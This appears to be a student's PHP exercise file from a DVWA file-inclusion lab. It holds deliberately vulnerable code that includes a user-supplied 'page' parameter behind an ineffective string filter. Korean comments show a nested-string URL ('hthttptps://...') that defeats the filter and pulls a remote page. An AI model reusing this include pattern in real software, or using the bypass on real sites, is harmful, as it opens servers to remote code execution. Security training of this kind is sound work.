
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<div id="main_body">
    <h1>-mildde-</h1>

</div>
</body>
<?php
include "C:\\xampp\\htdocs\\3.dvwa\\4.File Inclusion\\1-1.fi.php";

$file = $_GET[ 'page' ];
$_GET[ 'page' ] = str_replace( array( "http://", "https://" ), "", $file );
$_GET[ 'page' ] = str_replace( array( "../", "..\'" ), "", $file );
//원리는 커맨드 인젝션과 동일 그러나
//바꾸는 원리를 잘 이용하면
//http://localhost/3.dvwa/4.File%20Inclusion/4-1.FI.php?page=https://mailinnence.github.io/-Dvwa-4.FI/index.html
//이걸
//http://localhost/3.dvwa/4.File%20Inclusion/4-1.FI.php?page=hthttptps://mailinnence.github.io/-Dvwa-4.FI/index.html
//해서 한번 지워지므써 주소가 완성되게 만들어 공격을 할 수 있다.

if( isset( $file ) )

    include( $file );
else {
    header( 'Location:?page=include.php' );

    exit;
}
dvwaHtmlEcho( $page );
?>

</html>

